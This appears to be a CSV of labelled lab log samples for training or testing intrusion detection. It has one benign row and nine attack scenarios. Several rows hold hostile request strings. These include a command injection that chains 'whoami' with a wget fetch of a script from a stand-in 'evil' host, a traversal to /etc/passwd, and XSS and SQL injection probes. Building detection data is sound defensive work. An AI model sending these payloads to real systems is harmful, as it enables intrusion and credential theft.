id,attack_type,expected_label,log_example,source_file,capture_method
REAL-LAB-BENIGN-TRAFFIC,benign_traffic,benign,"lab-http src=192.168.56.20 dst=192.168.56.10 dpt=80 request=""GET /health HTTP/1.1"" scenario=benign_traffic source_pcap=benign_traffic.pcap",http_access.log,parsed_from_lab_pcap_payload
REAL-LAB-COMMAND-INJECTION,command_injection,malicious,"lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request=""GET /?cmd=whoami;wget http://evil/p.sh HTTP/1.1"" scenario=command_injection source_pcap=command_injection.pcap",http_access.log,parsed_from_lab_pcap_payload
REAL-LAB-DIRECTORY-TRAVERSAL,directory_traversal,malicious,"lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request=""GET /../../../../etc/passwd HTTP/1.1"" scenario=directory_traversal source_pcap=directory_traversal.pcap",http_access.log,parsed_from_lab_pcap_payload
REAL-LAB-DNS-TUNNELING,dns_tunneling,malicious,lab-dns src=192.168.56.20 dst=8.8.8.8 qtype=A query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.lab.example note=long DNS query encoded subdomain scenario=dns_tunneling source_pcap=dns_tunneling.pcap,dns_lab.log,parsed_from_lab_pcap_dns_query
REAL-LAB-ICMP-SWEEP,icmp_sweep,malicious,"lab-icmp src=203.0.113.10 targets=192.168.56.10,192.168.56.11,192.168.56.12,192.168.56.13,192.168.56.14 target_count=15 type=echo-request note=ICMP ping sweep scenario=icmp_sweep source_pcap=icmp_sweep.pcap",icmp_lab.log,parsed_from_lab_pcap_icmp_echo_requests
REAL-LAB-MALWARE-C2,malware_c2,malicious,"lab-http src=192.168.56.20 dst=198.51.100.20 dpt=80 request=""GET /gate.php HTTP/1.1"" scenario=malware_c2 source_pcap=malware_c2.pcap",http_access.log,parsed_from_lab_pcap_payload
REAL-LAB-PORT-SCAN,port_scan,malicious,"lab-fw scan_event src=203.0.113.10 dst=192.168.56.10 flags=SYN scan_ports=110,143,21,22,23,25,443,53,80,8080,8443 note=multiple ports scenario=port_scan source_pcap=port_scan.pcap",http_access.log,parsed_from_lab_pcap_syn_scan
REAL-LAB-SQL-INJECTION,sql_injection,malicious,"lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request=""GET /search?q=UNION SELECT HTTP/1.1"" scenario=sql_injection source_pcap=sql_injection.pcap",http_access.log,parsed_from_lab_pcap_payload
REAL-LAB-SSH-BRUTEFORCE,ssh_bruteforce,malicious,lab-sshd sshd[2200]: Failed password for admin from 203.0.113.10 to 192.168.56.10 repeated=8 scenario=ssh_bruteforce source_pcap=ssh_bruteforce.pcap,ssh_auth.log,derived_from_lab_pcap_ssh_payload_count
REAL-LAB-XSS,xss,malicious,"lab-http src=203.0.113.10 dst=192.168.56.10 dpt=80 request=""GET /?q=<script>alert(1)</script> HTTP/1.1"" scenario=xss source_pcap=xss.pcap",http_access.log,parsed_from_lab_pcap_payload
